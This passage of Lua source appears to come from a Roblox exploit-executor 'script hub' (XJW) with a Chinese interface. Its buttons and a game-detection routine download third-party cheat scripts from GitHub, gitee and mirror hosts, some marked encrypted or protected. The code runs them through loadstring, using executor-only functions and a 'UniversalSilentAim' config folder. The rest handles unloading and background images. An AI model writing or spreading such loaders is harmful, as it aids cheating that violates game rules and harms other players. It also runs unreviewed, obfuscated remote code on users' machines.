notify("动画","加载失败：动画ID无效或资源不存在 ("..tostring(id)..")",4)
end
end)
end
local Tabs_OtherScripts
local osTabOk,osTabErr=pcall(function()
Tabs_OtherScripts=Window:AddTab("其他脚本","file")
end)
if not osTabOk or not Tabs_OtherScripts then
warn("[XJW] 其他脚本标签创建失败: "..tostring(osTabErr))
pcall(function()
Tabs_OtherScripts=Window:AddTab("其他脚本","file")
end)
end
if Tabs_OtherScripts then
__XJW_GB("其他脚本")
local OtherScriptsBox=Tabs_OtherScripts:AddLeftGroupbox("其他脚本","folder")
__XJW_PACE()
OtherScriptsBox:AddButton("ROBv4",function()
safeLoad("https://raw.githubusercontent.com/idrobsc/rob_script/refs/heads/main/rob.v4")
end)
__XJW_PACE()
OtherScriptsBox:AddButton("AF HUB",function()
getgenv().SCRIPT_KEY=""
safeLoad("https://api.jnkie.com/api/v1/luascripts/public/4e025c3c0ccda1554634165acb8f8ee2c1de5f0f8d7f60e7b396c622d7e6e9b0/download")
end)
__XJW_PACE()
OtherScriptsBox:AddButton("叶脚本",function()
safeLoad("https://raw.githubusercontent.com/roblox-ye/QQ515966991/refs/heads/main/ROBLOX-CNVIP-XIAOYE.lua")
end)
__XJW_PACE()
OtherScriptsBox:AddButton("恐脚本",function()
__XJW_RUN("https://raw.githubusercontent.com/kongbaNB/9178/refs/heads/main/恐脚本.NB","恐脚本.NB")
end)
__XJW_PACE()
OtherScriptsBox:AddButton("款脚本",function()
__XJW_RUN("https://raw.githubusercontent.com/fgyhxrtm-ship-it/gghv/refs/heads/main/%E6%AC%BE%E8%84%9A%E6%9C%AC%E9%80%9A%E7%94%A8%E5%8A%A0%E5%AF%86.lua","款脚本通用加密")
end)
__XJW_PACE()
OtherScriptsBox:AddButton("RB脚本(免费版)",function()
__XJW_RUN("https://raw.githubusercontent.com/Yungengxin/roblox/refs/heads/main/Rb-Hub","Rb-Hub")
end)
__XJW_PACE()
OtherScriptsBox:AddButton("XK脚本(旧版)",function()
__XJW_RUN("https://github.com/devslopo/DVES/raw/main/XK%20Hub","XK Hub")
end)
__XJW_PACE()
OtherScriptsBox:AddButton("XK脚本(新版)",function()
__XJW_RUN("https://raw.githubusercontent.com/SyndromeXph/XK-Script/refs/heads/main/XoneK-Loader.luau","XoneK-Loader.luau")
end)
__XJW_PACE()
OtherScriptsBox:AddButton("BS脚本",function()
__XJW_RUN("https://gitee.com/BS_script/script/raw/master/BS_Script.Luau","BS_Script.Luau")
end)
__XJW_PACE()
OtherScriptsBox:AddButton("黑白脚本",function()
__XJW_RUN("https://raw.githubusercontent.com/tfcygvunbind/Apple/main/%E9%BB%91%E7%99%BD%E8%84%9A%E6%9C%AC%E5%8A%A0%E8%BD%BD%E5%99%A8","黑白脚本加载器")
end)
end
local Tabs_Server
local tabOk,tabErr=pcall(function()
Tabs_Server=Window:AddTab("服务器脚本(XJW)","server")
end)
if not tabOk or not Tabs_Server then
warn("[XJW] 服务器脚本标签创建失败: "..tostring(tabErr))
pcall(function()
Tabs_Server=Window:AddTab("服务器脚本(XJW)","server")
end)
end
if Tabs_Server then
local GAMES={
{
Name="寻找针头",
Url="https://raw.githubusercontent.com/xdigb91/78789191/refs/heads/main/%E5%AF%BB%E6%89%BE%E9%92%88%E5%A4%B4.lua",
PlaceId="108628039999641",
GameId="10756011174",
Places={"108628039999641"},
Keys={"Needle In A Haystack","Needle","Haystack"},
},
{
Name="力量传奇",
Url="https://raw.githubusercontent.com/xdigb91/78789191/refs/heads/main/%E5%8A%9B%E9%87%8F%E4%BC%A0%E5%A5%87.lua",
PlaceId="3623096087",
GameId="1268927906",
Places={"3623096087"},
Keys={"Muscle Legends","Muscle","力量传奇"},
},
{
Name="极速传奇",
Url="https://raw.githubusercontent.com/jiuyijiuyijiuyi91/78789191/refs/heads/main/XJW%E6%9E%81%E9%80%9F%E4%BC%A0%E5%A5%87.lua",
PlaceId="3101667897",
GameId="1119466531",
Places={"3101667897"},
Keys={"Legends of Speed"},
},
{
Name="建造一架飞机",
Url="https://raw.githubusercontent.com/xdigb91/78789191/refs/heads/main/%E5%BB%BA%E9%80%A0%E4%B8%80%E4%B8%AA%E9%A3%9E%E6%9C%BA.lua",
PlaceId="137925884276740",
GameId="7822444776",
Places={"137925884276740"},
Keys={"Build A Plane","Build a Plane"},
},
{
Name="[FPS]一键点击",
Url="https://raw.githubusercontent.com/xdigb91/78789191/refs/heads/main/FPS%E4%B8%80%E9%94%AE%E7%94%B5%E5%87%BB.lua",
PlaceId="90568084448279",
GameId="9294074907",
Places={"90568084448279"},
Keys={"One Tap"},
},
{
Name="捕捉10亿只鸭子",
Url="https://raw.githubusercontent.com/xdigb91/78789191/refs/heads/main/%E6%8D%95%E6%8D%8910%E4%BA%BF%E5%8F%AA%E9%B8%AD%E5%AD%90.lua",
PlaceId="100293509865504",
GameId="10516888336",
Places={"100293509865504"},
Keys={"1 Billion Ducks","Billion Ducks","Duck"},
},
{
Name="清理所有枫叶",
Url="https://raw.githubusercontent.com/xdigb91/78789191/refs/heads/main/%E6%B8%85%E7%90%86%E6%89%80%E4%BB%A5%E6%9E%AB%E5%8F%B6.lua",
PlaceId="92637789841354",
GameId="10539411000",
Places={"92637789841354"},
Keys={"Clean All The Leaves","Clean All the Leaves","Leaves","Leaf"},
},
{
Name="逃跑者",
Url="https://raw.githubusercontent.com/xdigb91/78789191/refs/heads/main/%E9%80%83%E8%B7%91%E8%80%85.lua",
PlaceId="118418618261207",
GameId="7585140258",
Places={"118418618261207"},
Keys={"逃跑者","Runaways","Runaway"},
},
{
Name="钻探至地球核心",
Url="https://raw.githubusercontent.com/xdigb91/78789191/refs/heads/main/%E9%92%BB%E6%8E%A2%E8%87%B3%E5%9C%B0%E7%90%83%E6%A0%B8%E5%BF%83.lua",
PlaceId="101906032112547",
GameId="9796898051",
Places={"101906032112547"},
Keys={"Drill to Earth's Core","Drill to Earth s Core","Drill","Earth's Core"},
},
{
Name="骑宠物",
Url="https://raw.githubusercontent.com/xdigb91/78789191/refs/heads/main/%E9%AA%91%E5%AE%A0%E7%89%A9.lua",
PlaceId="124216119978534",
GameId="10035204815",
Places={"124216119978534"},
Keys={"Ride A Pet","Ride","骑宠物"},
},
{
Name="海上100天(see脚本)",
Url="https://raw.githubusercontent.com/Yeju3/See/refs/heads/main/zhb.protected.luau",
PlaceId="70411440483149",
GameId="9167377564",
Places={"70411440483149"},
Keys={"100 Days At Sea","100 Days","Sea","海上100天","海上"},
},
{
Name="打破偷走鸡蛋",
Url="https://raw.githubusercontent.com/xdigb91/78789191/refs/heads/main/%E6%89%93%E7%A0%B4%E5%B9%B6%E5%81%B7%E8%B5%B0%E4%B8%80%E4%B8%AA%E9%B8%A1%E8%9B%8B.lua",
PlaceId="114326934417838",
GameId="10765288803",
Places={"114326934417838"},
Keys={"Break and Steal an Egg","Break and Steal","打破并偷走一个鸡蛋","打破并偷走"},
},
{
Name="迪格尔竞技场",
Url="https://raw.githubusercontent.com/xdigb91/78789191/refs/heads/main/%E8%BF%AA%E6%A0%BC%E5%B0%94%E7%AB%9E%E6%8A%80%E5%9C%BA.lua",
PlaceId="84556640895285",
GameId="10057403337",
Places={"84556640895285"},
Keys={"Deagle Arena","迪格尔竞技场"},
},
{
Name="钩中啦",
Url="https://raw.githubusercontent.com/xdigb91/78789191/refs/heads/main/%E9%92%A9%E4%B8%AD%E5%95%A6.lua",
PlaceId="70390793715007",
GameId="9663968307",
Places={"70390793715007"},
Keys={"Hooked!","钩中啦"},
},
{
Name="+1舌头逃脱",
Url="https://raw.githubusercontent.com/xdigb91/78789191/refs/heads/main/%2B1%E8%88%8C%E5%A4%B4%E9%80%83%E8%84%B1.lua",
PlaceId="122245938604556",
GameId="122245938604556",
Places={"122245938604556"},
Keys={"+1 Tongue Escape","Tongue Escape","+1舌头逃脱"},
},
{
Name="建造并击杀僵尸",
Url="https://raw.githubusercontent.com/xdigb91/78789191/refs/heads/main/%E5%BB%BA%E9%80%A0%E5%B9%B6%E5%87%BB%E6%9D%80%E5%83%B5%E5%B0%B8.lua",
PlaceId="105011592530400",
GameId="10741654282",
Places={"105011592530400"},
Keys={"Build and Kill Zombies","建造并击杀僵尸"},
},
{
Name="建造躲藏僵尸",
Url="https://raw.githubusercontent.com/xdigb91/78789191/refs/heads/main/%E5%BB%BA%E9%80%A0%E8%BA%B2%E8%97%8F%E7%9A%84%E7%94%9F%E5%AD%98%E5%83%B5%E5%B0%B8.lua",
PlaceId="125758178026954",
GameId="10289426907",
Places={"125758178026954"},
Keys={"Build Hide Survive Zombies","Build to Survive Zombies","建造躲藏的生存僵尸"},
},
{
Name="忍者传奇",
Url="https://raw.githubusercontent.com/xdigb91/78789191/refs/heads/main/%E5%BF%8D%E8%80%85%E4%BC%A0%E5%A5%87XJW.lua",
PlaceId="3956818381",
GameId="1335695570",
Places={"3956818381"},
Keys={"Ninja Legends","忍者传奇"},
},
{
Name="NPC或死亡",
Url="https://raw.githubusercontent.com/xdigb91/78789191/refs/heads/main/NPC%E6%88%96%E6%AD%BB%E4%BA%A1.lua",
PlaceId="11276071411",
GameId="4019583467",
Places={"11276071411"},
Keys={"NPC or DIE","NPC or Die","NPC或死亡"},
},
{
Name="扔一枚硬币",
Url="https://raw.githubusercontent.com/xdigb91/78789191/refs/heads/main/%E6%89%94%E4%B8%80%E6%9E%9A%E7%A1%AC%E5%B8%81.lua",
PlaceId="115681808123944",
GameId="10131390815",
Places={"115681808123944"},
Keys={"Throw a Coin","Throw","扔一枚硬币"},
},
{
Name="致命猴子",
Url="https://raw.githubusercontent.com/xdigb91/78789191/refs/heads/main/%E8%87%B4%E5%91%BD%E7%8C%B4%E5%AD%90.lua",
PlaceId="15318113891",
GameId="5283219861",
Places={"15318113891"},
Keys={"Lethal Ape","致命猴子"},
},
{
Name="圣奥里",
Url="https://raw.githubusercontent.com/xdigb91/78789191/refs/heads/main/%E5%9C%A3%E5%A5%A5%E9%87%8C.lua",
PlaceId="104841616983113",
GameId="6619936488",
Places={"104841616983113"},
Keys={"San Aurie","圣奥里"},
},
{
Name="动漫能力竞技场",
Url="https://raw.githubusercontent.com/xdigb91/78789191/refs/heads/main/%E5%8A%A8%E6%BC%AB%E8%83%BD%E5%8A%9B%E7%AB%9E%E6%8A%80%E5%9C%BA.lua",
PlaceId="108567435288296",
GameId="10399136326",
Places={"108567435288296"},
Keys={"Anime Ability Arena","动漫能力竞技场"},
},
{
Name="决斗场",
Url="https://raw.githubusercontent.com/xdigb91/78789191/refs/heads/main/%E5%86%B3%E6%96%97%E5%9C%BA.lua",
PlaceId="94217045453265",
GameId="9051406594",
Places={"94217045453265"},
Keys={"Dueling Grounds","Dueling","决斗场"},
},
}
local function serverNotify(title,text,duration)
pcall(function()
game:GetService("StarterGui"):SetCore("SendNotification",{
Title=tostring(title),
Text=tostring(text),
Duration=duration or 3,
})
end)
pcall(function()
warn("[XJW] "..tostring(title)..": "..tostring(text))
end)
end
local ServerLoadBox
local ServerInfoBox
pcall(function()
__XJW_GB("脚本加载")
ServerLoadBox=Tabs_Server:AddRightGroupbox("脚本加载","download")
end)
pcall(function()
__XJW_GB("当前服务器")
ServerInfoBox=Tabs_Server:AddLeftGroupbox("当前服务器","server")
end)
if ServerLoadBox and ServerInfoBox then
local ServerGameDropdown
local selectedServerGame=""
local serverResultLabel
local serverInfoLabels={}
local function setResult(text)
if serverResultLabel then
pcall(function()
serverResultLabel:SetText(tostring(text))
end)
end
end
local function cutText(s,maxWidth)
s=tostring(s or "")
if s==""then
return "-"
end
if utf8 and utf8.codes then
local total=0
for pos,code in utf8.codes(s)do
local w=(code<128)and 1 or 2
if total+w>maxWidth then
return s:sub(1,pos-1)..".."
end
total=total+w
end
return s
end
if#s>maxWidth then
local cut=maxWidth
while cut>0 do
local b=s:byte(cut+1)
if b and b>=128 and b<192 then
cut=cut-1
else
break
end
end
return s:sub(1,cut)..".."
end
return s
end
local function setInfo(placeId,gameId,mapName,productName)
local lines={
"PID "..cutText(placeId,18),
"GID "..cutText(gameId,18),
"地图 "..cutText(mapName,13),
"游戏 "..cutText(productName,13),
}
for i=1,#lines do
local lb=serverInfoLabels[i]
if lb then
pcall(function()
lb:SetText(lines[i])
end)
end
end
end
local function findServerGame(name)
if type(name)~="string"then
return nil
end
for _,g in ipairs(GAMES)do
if g.Name==name then
return g
end
end
return nil
end
local function buildMirrors(url)
local list={}
if type(url)~="string"or url==""then
return list
end
table.insert(list,url)
if string.find(url,"raw.githubusercontent.com",1,true)then
table.insert(list,"https://ghproxy.net/"..url)
table.insert(list,"https://gh-proxy.com/"..url)
local user,repo,branch,path=string.match(url,"raw%.githubusercontent%.com/([^/]+)/([^/]+)/refs/heads/([^/]+)/(.+)")
if user and repo and branch and path then
table.insert(list,"https://cdn.jsdelivr.net/gh/"..user.."/"..repo.."@"..branch.."/"..path)
end
end
return list
end
local function httpFetch(url)
local getters={}
table.insert(getters,function()
return HttpService:GetAsync(url)
end)
if type(request)=="function"then
table.insert(getters,function()
local r=request({Url=url,Method="GET"})
return r and r.Body or nil
end)
end
if type(http_request)=="function"then
table.insert(getters,function()
local r=http_request({Url=url,Method="GET"})
return r and r.Body or nil
end)
end
if type(syn)=="table"and type(syn.request)=="function"then
table.insert(getters,function()
local r=syn.request({Url=url,Method="GET"})
return r and r.Body or nil
end)
end
if type(http)=="table"and type(http.request)=="function"then
table.insert(getters,function()
local r=http.request({Url=url,Method="GET"})
return r and r.Body or nil
end)
end
local lastErr=nil
for _,getter in ipairs(getters)do
local ok,body=pcall(getter)
if ok and type(body)=="string"and#body>0 then
return body,nil
end
if not ok then
lastErr=tostring(body)
end
end
return nil,lastErr or "无可用下载方式"
end
local function fetchScript(g)
local cached=__XJW_CREAD(g.Url)
if cached then
return cached,1,nil
end
local body,src=__XJW_FETCH(g.Url)
if body then
__XJW_CWRITE(g.Url,body)
return body,1,nil
end
return nil,0,tostring(src or "所有下载源均失败")
end
local function loadServerScript(g)
if not g then
return
end
serverNotify("正在加载",g.Name,3)
task.spawn(function()
local okRun,body,mirrorIndex,lastErr=pcall(fetchScript,g)
if not okRun then
serverNotify("加载失败",tostring(body),6)
warn("[XJW] "..g.Name.." 下载异常: "..tostring(body))
return
end
if not body then
serverNotify("加载失败",g.Name.." 下载失败",6)
warn("[XJW] "..g.Name.." 下载失败: "..tostring(lastErr))
return
end
local compile=loadstring or load
local fn,compileErr=compile(body)
if not fn then
serverNotify("编译失败",tostring(compileErr),6)
warn("[XJW] "..g.Name.." 编译失败: "..tostring(compileErr))
return
end
serverNotify("加载成功",g.Name,3)
local runOk,runErr=pcall(fn)
if not runOk then
serverNotify("运行出错",tostring(runErr),6)
warn("[XJW] "..g.Name.." 运行出错: "..tostring(runErr))
end
end)
end
local liveCache={placeId=nil,productName=nil}
local function getLiveInfo()
local placeId,gameId,mapName="?","?","?"
pcall(function()
placeId=tostring(game.PlaceId)
end)
pcall(function()
gameId=tostring(game.GameId)
end)
pcall(function()
mapName=tostring(game.Name or "?")
end)
if gameId==""or gameId=="0"then
gameId="不可用"
end
if liveCache.placeId~=placeId then
liveCache.placeId=placeId
liveCache.productName=nil
pcall(function()
local info=game:GetService("MarketplaceService"):GetProductInfo(tonumber(placeId))
if info and info.Name then
liveCache.productName=tostring(info.Name)
end
end)
end
return placeId,gameId,mapName,(liveCache.productName or "-")
end
local function collectIds(g)
local ids={}
if g.PlaceId and g.PlaceId~=""then
table.insert(ids,tostring(g.PlaceId))
end
if g.GameId and g.GameId~=""then
table.insert(ids,tostring(g.GameId))
end
if type(g.Places)=="table"then
for _,v in ipairs(g.Places)do
if v and tostring(v)~=""then
table.insert(ids,tostring(v))
end
end
end
return ids
end
local function detectGame()
local placeId,gameId,mapName,productName=getLiveInfo()
for _,g in ipairs(GAMES)do
for _,id in ipairs(collectIds(g))do
if id==placeId then
return g,"PlaceId 匹配"
end
if gameId~="不可用"and gameId~="?"and id==gameId then
return g,"GameId 匹配"
end
end
end
local names={string.lower(mapName),string.lower(productName)}
for _,g in ipairs(GAMES)do
for _,k in ipairs(g.Keys or{})do
local key=string.lower(k)
for _,n in ipairs(names)do
if n and n~=""and n~="-"and string.find(n,key,1,true)then
return g,"名称匹配("..k..")"
end
end
end
end
return nil,"未匹配"
end
local function refreshServer()
local placeId,gameId,mapName,productName=getLiveInfo()
setInfo(placeId,gameId,mapName,productName)
local g=detectGame()
if g then
selectedServerGame=g.Name
setResult(g.Name)
if ServerGameDropdown then
pcall(function()
ServerGameDropdown:SetValue(g.Name)
end)
end
else
setResult("未识别到当前服务器")
end
return g
end
local buildOk,buildErr=pcall(function()
local ServerGameNames={}
for _,g in ipairs(GAMES)do
table.insert(ServerGameNames,g.Name)
end
ServerGameDropdown=ServerLoadBox:AddDropdown("ServerGameList",{
Text="选择游戏脚本",
Values=ServerGameNames,
Default="",
Multi=false
})
ServerGameDropdown:OnChanged(function(v)
if type(v)=="string"and v~=""then
selectedServerGame=v
end
end)
__XJW_PACE()
ServerLoadBox:AddButton("加载选中脚本",function()
local g=findServerGame(selectedServerGame)
if not g then
serverNotify("服务器脚本","请先在下拉框选择脚本",3)
return
end
loadServerScript(g)
end)
serverResultLabel=ServerInfoBox:AddLabel("检测中")
serverInfoLabels={
ServerInfoBox:AddLabel("PID 读取中..."),
ServerInfoBox:AddLabel("GID 读取中..."),
ServerInfoBox:AddLabel("地图 读取中..."),
ServerInfoBox:AddLabel("游戏 读取中..."),
}
__XJW_PACE()
ServerInfoBox:AddButton("重新识别",function()
task.spawn(function()
refreshServer()
end)
end)
__XJW_PACE()
ServerInfoBox:AddButton("加载当前服务器",function()
task.spawn(function()
local g=refreshServer()
if g then
serverNotify("已识别当前服务器",g.Name,3)
loadServerScript(g)
else
serverNotify("未识别到当前服务器","当前服务器不在支持列表内",5)
end
end)
end)
__XJW_PACE()
ServerInfoBox:AddLabel("支持服务器 "..tostring(#GAMES).." 个")
for idx,gameItem in ipairs(GAMES)do
__XJW_PACE()
ServerInfoBox:AddLabel(idx..". "..gameItem.Name)
end
end)
if not buildOk then
warn("[XJW] 服务器脚本标签创建失败: "..tostring(buildErr))
pcall(function()
serverNotify("服务器脚本","标签创建失败，请查看控制台",6)
end)
end
task.spawn(function()
pcall(refreshServer)
end)
end
end
__XJW_LBL("构建:界面设置页签")
__XJW_LBL("设置页-建页签")
Tabs["UI Settings"]=Window:AddTab("界面设置","settings","更换界面主题与保存配置！")
__XJW_LBL("设置页-页签已建")
local function XJUnload()
task.defer(function()
pcall(function()BOOT.finished=true end)
pcall(function()if BOOT and type(BOOT.hideFloats)=="function"then BOOT.hideFloats()end end)
pcall(function()Library.Unloaded=true end)
pcall(function()
if Library and type(Library.Unload)=="function"then
Library:Unload()
end
end)
pcall(function()XJWFloat.destroy()end)
pcall(function()
if type(getgenv)=="function" and type(getgenv().XJW_BSCleanup)=="function"then
getgenv().XJW_BSCleanup()
end
end)
pcall(function()
if type(getgenv)=="function" and type(getgenv().XJW_BGClear)=="function"then
getgenv().XJW_BGClear()
end
end)
end)
end
local UnloadTopBox
pcall(function()
UnloadTopBox=Tabs["UI Settings"]:AddLeftGroupbox("卸载","trash")
end)
if not UnloadTopBox then
pcall(function()
UnloadTopBox=Tabs["UI Settings"]:AddLeftGroupbox("卸载")
end)
end
if UnloadTopBox then
UnloadTopBox:AddButton({
Text="卸载脚本",
Func=function()
local okDialog=pcall(function()
Window:AddDialog("XJWUnloadConfirm",{
Title="卸载脚本",
Description="确定要卸载脚本吗？所有已启用的功能将被关闭，脚本随即终止。",
AutoDismiss=true,
OutsideClickDismiss=true,
FooterButtons={
Cancel={Title="取消",Variant="Ghost",Order=1,Callback=function()end},
Unload={Title="卸载",Variant="Destructive",Order=2,Callback=function()XJUnload()end},
},
})
end)
if not okDialog then
XJUnload()
end
end,
})
end
do
do
local okFloat,FloatBox=pcall(function()return Tabs["UI Settings"]:AddRightGroupbox("悬浮窗","image")end)
if not okFloat then FloatBox=nil end
if FloatBox then
BOOT.dropdown=FloatBox:AddDropdown("XJWFloatStyle",{
Text="悬浮窗样式",
Values={"灵动岛","悬浮窗","黑曜石悬浮窗"},
Default="灵动岛",
AllowNull=false,
Multi=false,
Tooltip="灵动岛为透明胶囊，点击展开面板；悬浮窗为圆形浮标；两者均可拖动到任意位置",
Callback=function(value)
BOOT.styleKey=value
pcall(function()XJWFloat.setStyle(value)end)
end,
})
end
end
__XJW_LBL("设置页-基础控件完成")
local SettingsTab=Tabs["UI Settings"]
local SettingsFolder="UniversalSilentAim/Configs"
if type(SettingsTab)=="table"then
task.spawn(function()
__XJW_LBL("设置页-主题")
if type(ThemeManager)=="table"then
pcall(function()
ThemeManager:SetLibrary(Library)
ThemeManager:SetFolder(SettingsFolder)
ThemeManager:ApplyToTab(SettingsTab)
end)
end
__XJW_LBL("设置页-配置")
if type(SaveManager)=="table"then
pcall(function()
SaveManager:SetLibrary(Library)
SaveManager:SetFolder(SettingsFolder)
SaveManager:BuildConfigSection(SettingsTab)
SaveManager:LoadAutoloadConfig()
end)
end
__XJW_LBL("设置页-配置完成")
end)
local MOLI_BG_NAME="茉莉路"
local BG_CDN_MAIN="https://cdn.jsdelivr.net/gh/jiuyijiuyijiuyi91/XJW666@main/"
local BG_CDN_GCORE="https://gcore.jsdelivr.net/gh/jiuyijiuyijiuyi91/XJW666@main/"
local BG_CDN_FASTLY="https://fastly.jsdelivr.net/gh/jiuyijiuyijiuyi91/XJW666@main/"
local BG_CDN_CF="https://testingcf.jsdelivr.net/gh/jiuyijiuyijiuyi91/XJW666@main/"
local BG_RAW="https://raw.githubusercontent.com/jiuyijiuyijiuyi91/XJW666/refs/heads/main/"
local BG_FILE_WALL="XJW%E8%84%9A%E6%9C%AC%E5%A3%81%E7%BA%B8.png"
local BG_FILE_MOLI="%E8%8C%89%E8%8E%89%E8%B7%AF%E6%9C%AC%E4%BA%BA.jpg"
local BG_FILE_GROUP1="%E7%BE%A4%E5%8F%8B%E5%88%86%E4%BA%AB.png"
local BG_FILE_GROUP2="%E7%BE%A4%E5%8F%8B%E5%88%86%E4%BA%AB%282%29.jpg"
local function bgSources(file)
return{BG_CDN_MAIN..file,BG_CDN_GCORE..file,BG_CDN_FASTLY..file,BG_CDN_CF..file,BG_RAW..file}
end
local BG={
bg="",
img="",
lib="",
cache={},
tag="_r3",
robloxId="",
}
BG.assetFn=function()
if type(getcustomasset)=="function"then return getcustomasset end
if type(getsynasset)=="function"then return getsynasset end
return nil
end
BG.key=function(url)
local h=5381
for i=1,#url do
h=(h*33+string.byte(url,i))%4294967296
end
return string.format("%x",h)
end
BG.extOf=function(body)
local head=string.sub(body,1,12)
if string.sub(head,1,4)=="\137PNG"then return ".png"end
if string.sub(head,1,3)=="\255\216\255"then return ".jpg"end
if string.sub(head,1,4)=="GIF8"then return ".gif"end
if string.sub(head,1,4)=="RIFF"and string.sub(head,9,12)=="WEBP"then return ".webp"end
return ".png"
end
BG.ensureFolder=function()
if type(isfolder)~="function"or type(makefolder)~="function"then return end
pcall(function()
if not isfolder("Obsidian")then makefolder("Obsidian")end
if not isfolder("Obsidian/bg")then makefolder("Obsidian/bg")end
end)
end
BG.httpGet=function(url)
local ok,body=pcall(function()
if type(request)=="function"then
local res=request({Url=url,Method="GET"})
if type(res)=="table"and tonumber(res.StatusCode)==200 and type(res.Body)=="string"and#res.Body>0 then
return res.Body
end
end
return nil
end)
if ok and type(body)=="string"and#body>0 then return body end
ok,body=pcall(function()return HttpService:GetAsync(url,true)end)
if ok and type(body)=="string"and#body>0 then return body end
ok,body=pcall(function()return HttpService:GetAsync(url)end)
if ok and type(body)=="string"and#body>0 then return body end
return nil
end
BG.setCache=function(url,asset)
local n=0
for _ in pairs(BG.cache)do n=n+1 end
if n>=64 then
BG.cache={}
end
BG.cache[url]=asset
end
BG.clearCache=function()
BG.cache={}
BG.objs={}
end
if type(getgenv)=="function"then
getgenv().XJW_BGClear=BG.clearCache
end
BG.localize=function(url)
if type(url)~="string"or url==""then return nil end
if BG.cache[url]then return BG.cache[url]end
local fn=BG.assetFn()
if fn==nil then
return nil
end
if type(writefile)~="function"then
return nil
end
BG.ensureFolder()
local cacheKey=BG.tag.."_"..BG.key(url)
for _,ext in ipairs({".png",".jpg",".webp",".gif"})do
local cachedPath="Obsidian/bg/"..cacheKey..ext
if type(isfile)=="function"and isfile(cachedPath)then
local okA,cachedAsset=pcall(fn,cachedPath)
if okA and type(cachedAsset)=="string"and cachedAsset~=""then
BG.setCache(url,cachedAsset)
return cachedAsset
end
end
end
local body=BG.httpGet(url)
if body==nil then
return nil
end
if#body<1024 then
return nil
end
local path="Obsidian/bg/"..BG.tag.."_"..BG.key(url)..BG.extOf(body)
local okWrite=false
if type(isfile)=="function"and isfile(path)and type(readfile)=="function"then
local okRead,old=pcall(readfile,path)
okWrite=okRead and type(old)=="string"and#old==#body
end
if not okWrite then
okWrite=pcall(writefile,path,body)
end
if not okWrite then
return nil
end
local okAsset,asset=pcall(fn,path)
if okAsset and type(asset)=="string"and asset~=""then
BG.setCache(url,asset)
return asset
end
return nil
end
BG.objs={}
BG.targets=function()
local list={}
local gui=Library and Library.ScreenGui
if not gui then return list end
local main=gui:FindFirstChild("Main")
pcall(function()
for _,obj in ipairs(gui:GetChildren())do
if obj:IsA("ImageLabel")and obj.BackgroundTransparency==1 and obj:FindFirstChildOfClass("UICorner")then
local okSize=true
if main then
okSize=obj.AbsoluteSize.X>=main.AbsoluteSize.X*0.9 and obj.AbsoluteSize.Y>=main.AbsoluteSize.Y*0.9
end
if okSize then
table.insert(list,obj)
end
end
end
end)
return list
end
BG.push=function(img,libUrl)
BG.objs={}
if type(Library)=="table"and type(Library.SetBackgroundImage)=="function"and type(libUrl)=="string"then
pcall(function()Library:SetBackgroundImage(libUrl)end)
end
for _,obj in ipairs(BG.targets())do
pcall(function()
obj.Image=img
obj.ScaleType=BACKGROUND_SCALE_MODE
obj.ImageTransparency=(img==""and 1)or BACKGROUND_IMAGE_TRANSPARENCY
end)
end
end
BG.apply=function(cands,idx)
if type(cands)~="table"then
if type(cands)=="string"then cands={cands}else return end
end
idx=idx or 1
if idx>#cands then
BG.bg=""
BG.img=""
BG.lib=""
BG.push("","")
return
end
local url=cands[idx]
BG.bg=url
BG.lib=url
if url==""then
BG.img=""
BG.push("","")
return
end
if BG.robloxId~=""then
local id=tostring(BG.robloxId)
if not string.find(id,"rbxassetid://",1,true)then
id="rbxassetid://"..id
end
BG.img=id
BG.push(id,url)
return
end
BG.img=""
BG.push("",url)
task.spawn(function()
local localAsset=BG.localize(url)
if BG.bg~=url then return end
if localAsset then
BG.img=localAsset
BG.push(localAsset,url)
return
end
BG.apply(cands,idx+1)
end)
end
__XJW_LBL("设置页-背景准备完成")
local installBgDropdown
installBgDropdown=function(attempt)
attempt=attempt or 0
local gb=SettingsTab.Groupboxes and SettingsTab.Groupboxes["Themes"]
if not gb or type(gb.Elements)~="table"then
if attempt<24 then task.delay(0.5,function() pcall(installBgDropdown,attempt+1) end) end
return
end
local native
for _,el in ipairs(gb.Elements)do
local isBox=false
pcall(function()isBox=el.Container~=nil and el.Container:IsA("TextBox")end)
if isBox and(el.Text=="Background Image"or el.Text=="背景图片")then
native=el
break
end
end
if native then
if type(native.SetVisible)=="function"then pcall(function()native:SetVisible(false)end)end
pcall(function()if native.Holder then native.Holder.Visible=false end end)
end
local presets={
{"默认立绘",bgSources(BG_FILE_WALL)},
{"无背景（纯主题配色）",{""}},
{MOLI_BG_NAME,bgSources(BG_FILE_MOLI)},
{"群友分享",bgSources(BG_FILE_GROUP1)},
{"群友分享(2)",bgSources(BG_FILE_GROUP2)},
}
local TM=Library.ThemeManager
if type(TM)=="table"and type(TM.BuiltInThemes)=="table"then
local used={}
for name,theme in pairs(TM.BuiltInThemes)do
local data=type(theme)=="table"and theme[2]
local img=type(data)=="table"and data.BackgroundImage
if type(img)=="string"and img~=""and not used[img]and type(name)=="string"then
used[img]=true
table.insert(presets,{"主题背景 · "..name,{img}})
end
end
end
local values,map={},{}
for _,preset in ipairs(presets)do
if map[preset[1]]==nil then
map[preset[1]]=preset[2]
table.insert(values,preset[1])
end
end
local picked="默认立绘"
local dd=gb:AddDropdown("BackgroundImagePick",{
Text="背景图片",
Values=values,
Default=picked,
AllowNull=false,
Multi=false,
Tooltip="选择窗口背景立绘，支持主题自带背景",
Callback=function(value)
local cands=map[value]
if cands==nil then return end
picked=value
BG.apply(cands)
end,
})
if not dd then return end
BG.apply(map[picked])
task.spawn(function()
game:GetService("RunService").RenderStepped:Connect(function()
if BG.lib==""then return end
local gui=Library and Library.ScreenGui
if not gui then return end
if#BG.objs==0 then
BG.objs=BG.targets()
end
if#BG.objs==0 then return end
local main=gui:FindFirstChild("Main")
local wantShow=main~=nil and main.Visible
for _,obj in ipairs(BG.objs)do
if obj.Parent==nil then
BG.objs={}
return
end
if BG.img~=""then
if obj.Image~=BG.img then
obj.Image=BG.img
obj.ScaleType=BACKGROUND_SCALE_MODE
obj.ImageTransparency=BACKGROUND_IMAGE_TRANSPARENCY
end
if obj.Visible~=wantShow then
obj.Visible=wantShow
end
end
end
end)
while true do
pcall(function()
local scheme=Library and Library.Scheme
if type(scheme)=="table"and type(BG.lib)=="string"and BG.lib~=""and scheme.BackgroundImage~=BG.lib then
BG.push(BG.img,BG.lib)
BG.objs={}
end
end)
task.wait(0.75)
end
end)
local list={}
for _,el in ipairs(gb.Elements)do
if el~=dd then table.insert(list,el)end
end
local idx=#list
for i,el in ipairs(list)do
if el==native then idx=i-1 break end
end
table.insert(list,math.max(1,idx+1),dd)
for i,el in ipairs(list)do
pcall(function()
if el.Holder then el.Holder.LayoutOrder=i end
end)
end
if type(gb.Resize)=="function"then pcall(function()gb:Resize()end)end
